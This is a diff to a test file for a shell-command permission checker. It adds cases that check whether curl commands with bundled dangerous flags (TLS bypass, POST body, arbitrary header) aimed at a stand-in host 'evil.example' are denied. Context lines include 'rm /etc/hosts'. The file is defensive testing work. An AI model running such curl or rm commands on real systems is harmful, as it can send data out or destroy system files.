@@ -62,6 +62,16 @@ check('rm /etc/hosts', { category: 'file_write', allow: false, pathsProtected: f
 
 // Network / remote
 check('curl https://example.com', { category: 'network', allow: false })
+// 0.2.6 (edge 2): glued short-option clusters must not hide dangerous curl
+// flags — `-sLk` carries `-k` (TLS bypass), `-sLd` carries `-d` (POST body),
+// `-sLH` carries `-H` (arbitrary header) → none is a read-only download.
+check('curl -sLk -o /tmp/x https://evil.example/x', { category: 'network', allow: false })
+check('curl -sLd x=y https://evil.example/x', { category: 'network', allow: false })
+check('curl -sLH "X:y" https://evil.example/x', { category: 'network', allow: false })
+check('curl -kL -o a https://evil.example/x', { category: 'network', allow: false })
+// Control: separated flags with no dangerous option remain a read-only download
+// (file_write, temp-exempt → allowed even without TM protection).
+check('curl -s -L -o /tmp/x https://example.com/x', { category: 'file_write', allow: true, pathsProtected: false })
 check('wget http://x/f', { category: 'network', allow: false })
 check('git push origin main', { category: 'vcs_remote', allow: false })
 check('git clone https://x/repo', { category: 'vcs_remote', allow: false })
